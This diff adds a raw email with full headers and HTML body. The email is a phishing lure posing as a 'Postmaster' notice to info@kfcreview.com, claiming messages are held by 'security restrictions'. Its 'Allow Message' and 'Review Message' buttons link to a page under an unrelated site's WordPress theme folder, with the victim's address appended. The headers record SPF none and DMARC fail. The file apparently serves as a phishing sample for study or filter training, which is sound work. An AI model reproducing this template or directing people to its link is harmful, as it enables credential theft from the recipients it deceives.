@@ -1,0 +1,113 @@
+Return-Path: <Postmaster@kfcreview.com>
+Received: from kfcreview.com ([160.250.133.232])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id om3u0c0pj6d4s7ottsph3i2voki8dgoql98srso1
+ for info@kfcreview.com;
+ Mon, 15 Jun 2026 06:57:58 +0000 (UTC)
+Received-SPF: none (spfCheck: 160.250.133.232 is neither permitted nor denied by domain of kfcreview.com) client-ip=160.250.133.232; envelope-from=Postmaster@kfcreview.com; helo=kfcreview.com;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 160.250.133.232 is neither permitted nor denied by domain of kfcreview.com) client-ip=160.250.133.232; envelope-from=Postmaster@kfcreview.com; helo=kfcreview.com;
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFISFhaSUV6UXRZOUVhM1p3STI3Yk5US01oSHRwV2RURm9uT0MxZ0E4REtQa0JpY0dOQUtCUm1tUkRqUytqdTMyMTBveGZqV1dEaGtYci8za3BUZURpdlg2L3pCMXNBZFRGeXpNN1dwcHIzQWE3Tm1ZYVduS0ZHSzhwT3VmblhKSjdMa3k1MWhWUm5BeU1OWVhvYWlaclI0U0hSN3FqcWhyMVNSc3dwamtTZlNHNTNBRm1BMXdVc05XM1lQenk1MldxbVZpbFZkQjlPRFIzcmthNzFLNWpOYmNmZnNIZno4dURpRXlKc3AzcGZPNHNZRDNiTzR3NmJTZTQ5alNkKzNZRHVpdE1hR1hySU1iUzhNZFB1OVA2Q2J5SGxMZzJIbmZKRTVWWEtCelc5bFdZenh4ZXY5aTd4R1QzaGlmU0cvS2M9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=FowoYxrUcyeNeSCPQgsIK2TcsAWslFWSaxxrpQ+lEumqgkXF4CRL+U9wyZtpnRQJg+/y6ZxqC5isDBSMIT8MQWfU5NloIbC7LG1ICDRieUZ9rZVGW3jxw1iCUOQS0QKabuojSzArm8g7NOeagzKFY+IFbmu4OkK4C42Q94Ekh6Y=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1781506679; v=1; bh=b27ltvYrGGbU3FPP40g+eW4oF2UJTTEh2efq+QUyHxU=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: =?UTF-8?B?UG9zdG1hc3RlcsKg?=kfcreview.com <Postmaster@kfcreview.com>
+To: info@kfcreview.com
+Subject: Verify Your Account info@kfcreview.com
+Date: 15 Jun 2026 13:57:47 +0700
+Message-ID: <20260615135747.08EA523551D5B8E7@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"text-align: center; color: rgb(34, 34, 34); text-transform: n=
+one; line-height: 1.6; text-indent: 0px; letter-spacing: normal; padding-to=
+p: 0px; font-family: Helvetica, Arial, sans-serif; font-size: 14px; font-st=
+yle: normal; font-weight: 400; margin-bottom: 16px; word-spacing: 0px; bord=
+er-top-color: currentColor; border-top-width: 0px; border-top-style: none; =
+white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255,=
+ 255); font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial;"><p style=3D"margin: 0px 0px 12px;"><strong style=3D"font-weight: =
+bolder;">Postmaster</strong><span>&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;kfcreview.com<span>&nbsp;</span>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong style=3D"font-we=
+ight: bolder;">Recipient: planning</strong>&nbsp;<br></p><table style=3D"pa=
+dding: 0px; width: 557px; text-align: left; margin-right: auto; margin-left=
+: auto; border-collapse: collapse; min-height: 10px;" cellspacing=3D"0" cel=
+lpadding=3D"0"><tbody><tr height=3D"10">
+<td width=3D"180" height=3D"10" style=3D"margin: 0px; padding: 0px; width: =
+180px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; font-size: 6px; min-height: 10px;" bgcolor=3D"#c00000">&nbsp=
+;</td><td width=3D"4" height=3D"10" style=3D"margin: 0px; padding: 0px; wid=
+th: 4px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Ar=
+ial, sans-serif; font-size: 6px; min-height: 10px;" bgcolor=3D"#ffffff"></t=
+d>
+<td width=3D"180" height=3D"10" style=3D"margin: 0px; padding: 0px; width: =
+180px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; font-size: 6px; min-height: 10px;" bgcolor=3D"#cccccc"></td>=
+<td width=3D"4" height=3D"10" style=3D"margin: 0px; padding: 0px; width: 4p=
+x; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, s=
+ans-serif; font-size: 6px; min-height: 10px;" bgcolor=3D"#ffffff"></td>
+<td width=3D"180" height=3D"10" style=3D"margin: 0px; padding: 0px; width: =
+180px; line-height: 10px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif; font-size: 6px; min-height: 10px;" bgcolor=3D"#cccccc">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;=20
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;</td></tr></tbody></table><br><p style=3D"font-family: arial, sans-s=
+erif; margin-top: 0px; text-shadow: none;">&nbsp; We're reaching out&nbsp;t=
+o let you know that we were unable to deliver&nbsp;some message(s) to your<=
+br>&nbsp; email address due to<span>&nbsp;</span><span style=3D"color: rgb(=
+214, 40, 40); text-shadow: none;" dir=3D"ltr"><span>
+&nbsp;</span>security&nbsp;restrictions<span>&nbsp;</span><span>&nbsp;</spa=
+n><font color=3D"#000000" style=3D"background-color: inherit;">on your mail=
+&nbsp;server.</font></span></p><p style=3D"font-family: arial, sans-serif; =
+margin-top: 0px; text-shadow: none;"><span style=3D"color: rgb(214, 40, 40)=
+; text-shadow: none;" dir=3D"ltr"><font color=3D"#000000" style=3D"backgrou=
+nd-color: inherit;">&nbsp; It appears that your system settings is currentl=
+y blocking incoming messages.</font></span></p>
+<p style=3D"margin: 0px 0px 12px;"><strong style=3D"font-weight: bolder;">&=
+nbsp; Account Information:</strong></p><p style=3D"margin: 0px 0px 12px;">&=
+nbsp;&nbsp;Email Address: info@kfcreview.com</p><p style=3D"margin: 0px 0px=
+ 12px;">&nbsp;&nbsp;Status:&nbsp;<span style=3D"color: rgb(243, 12, 46);">H=
+eld</span></p>
+	<a style=3D"margin: 8px 4px; padding: 10px 20px; color: rgb(255, 255, 255)=
+; font-weight: bold; text-decoration: none; cursor: pointer; background-col=
+or: rgb(0, 122, 204);" href=3D"https://yogisandyoginis.com/wp-content/theme=
+s/DiviB/hm1166.htm#info@kfcreview.com" target=3D"_blank" rel=3D"nofollow">A=
+llow Message</a><span>&nbsp;</span><span>&nbsp;</span><span><span>&nbsp;</s=
+pan>&nbsp;</span>
+&nbsp; &nbsp;<a style=3D"margin: 8px 4px; padding: 10px 20px; color: rgb(33=
+, 33, 33); font-weight: bold; text-decoration: none; cursor: pointer; backg=
+round-color: rgb(224, 224, 224);" href=3D"https://yogisandyoginis.com/wp-co=
+ntent/themes/DiviB/hm1166.htm#info@kfcreview.com" target=3D"_blank" rel=3D"=
+nofollow">Review Message</a></div>
+<div style=3D"text-align: center; color: rgb(102, 102, 102); text-transform=
+: none; text-indent: 0px; letter-spacing: normal; font-family: Helvetica, A=
+rial, sans-serif; font-size: 10px; font-style: normal; font-weight: 400; ma=
+rgin-top: 16px; word-spacing: 0px; white-space: normal; orphans: 2; widows:=
+ 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; f=
+ont-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-t=
+hickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;">&copy; 2026. All Rights Reserved.</div>
+
+
+
+</body></html>
